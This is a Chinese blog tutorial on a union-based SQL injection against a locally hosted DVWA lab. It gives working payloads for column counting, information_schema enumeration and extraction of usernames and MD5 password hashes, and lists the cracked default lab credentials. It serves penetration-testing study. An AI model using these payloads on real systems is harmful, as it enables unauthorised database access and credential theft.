---
title: "SQL注入（Union注入）"
date: 2019-08-13T10:37:42+08:00
description: "GET - 有报错 - 单引号 - 字符型注入"
draft: false
hideToc: false
enableToc: true
enableTocContent: false
tocPosition: inner
tocLevels: ["h2", "h3", "h4"]
tags:
- "OWASP-TOP 10"
- "DVWA靶场"
- "SQL注入"
categories:
- "渗透测试"
series:
- "技术研究"
image: 
---

- 漏洞类型：SQL注入/Get 字符型

- 安全级别：Low

- 目标：通过注入SQL语句，获取 MySql 数据库存放的用户名和密码

- 页面URL：http://www.dvwa.com/vulnerabilities/sqli/?id=1（本地搭建的靶场）

![正常页面](https://ae01.alicdn.com/kf/U4ef8e082a42c404f8be88e4db38b0ef33.png)

---

## 判断注入类型

### 正常输入数字查询信息，下图为为输入3时，显示的信息。

![user id=3](https://ae01.alicdn.com/kf/Ua09c3083509142c0bd8eb5051a18ee5el.png)

### 数字后面，加上单引号测试

> http://www.dvwa.com/vulnerabilities/sqli/?id=1'&Submit=Submit#

### 得到报错，不过还不能确定是字符型，还是数字型注入。


> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1

### 去掉 id=1 后的 “单引号” 继续用布尔值测试

布尔值

> ①：?id=1 and 1=1&Submit=Submit#
> 
> ②：?id=1 and 1=2&Submit=Submit#


在正常的查询语句后，加上**"and 1=1"**和**"and 1=2"**后，页面仍然正常显示，并正常查询出了用户基本信息

![1 and 1=1](https://ae01.alicdn.com/kf/U98a6416bef494ecb942db80ba1cb148cP.png)

如果是数字型注入，id=1 后拼接 “and 1=2”后， 页面应该显示异常，或者有报错信息。
![1 and 1=2](https://ae01.alicdn.com/kf/Ubde00ab900c145fd99b418351422885aB.png)

所以，基本确定，这是一个**字符型注入**，注入的语句，要采用闭合单引号方法，使之带入后端查询。

## 判断当前页面，读取表的字段数量


> ①：'+order by 3--+
> 
> ②：'+order by 4--+


### order by 2：页面正常

![页面正常](https://images.weserv.nl/?url=https://img03.sogoucdn.com/app/a/100520146/8c97c2f5ef0dae6d74601e6629eeb1a1)

### order by 3：页面异常，报错

![order by判断字段数](https://images.weserv.nl/?url=https://img02.sogoucdn.com/app/a/100520146/c26b54c4a6b4ec505140b13414829594)

## 确认信息在当前页面，显示的位置


> '+union select 1,2--+

![确认回显位置](https://ae01.alicdn.com/kf/Ucfc3c435aa4a4862820c36cd6044fbf1P.png)


> '+union select database(),version()--+

![查询数据库名、版本信息](https://ae01.alicdn.com/kf/U04cd6a2fa8c147fa9b8c5985bc618e76a.png)


## 读取当前页面，使用的数据库、表


> '+union+select table_schema,table_name
> from+information_schema.tables
> where+table_schema=database()--+


![库名、表名](https://ae01.alicdn.com/kf/U4165d5261666491fa520a4cfddadd0229.png)

## 读取users表的所有字段


> '+union select table_name,column_name 
from information_schema.columns 
where table_schema=database() and table_name='users'--+

![user表所有字段名](https://ae01.alicdn.com/kf/Ubeb6e448ad6e445eb82d6e2038fe79ab1.png)

我们看到了 “user”，“password” 字段，这两列里面，包含的内容这就是我们得目标了。

接下来就要从users表中，读取这两个字段得内容了。

## 读取用户名和密码


> ' union select user,password from dvwa.users--+


![用户名、密码](https://ae01.alicdn.com/kf/U405e22e37ac44aedb0ef8c48d1b5b9380.png)

密码被加密保存，目测（滑稽）md5加密

## 解密md5，得到登陆密码
> admin：5f4dcc3b5aa765d61d8327deb882cf99（password）
> 
> gordonb：e99a18c428cb38d5f260853678922e03（abc123）
> 
> 1337：8d3533d75ae2c3966d7e0d4fcc69216b（charley）
> 
> pablo：0d107d09f5bbe40cade3de5c71e9e9b7（letmein）
> 
> smithy：5f4dcc3b5aa765d61d8327deb882cf99（password）



## 总结

- 先看传输参数，是用的HTTP协议中的，那种传输方式
- 再判断是字符型还是数字型的注入，选择闭合或者其他方法，保证语句生效
- 确定网站页面信息的回显位置
- 构建SQL查询语句
- "+" 和 空格效果一样，但是在cookie注入时，用"+"代替空格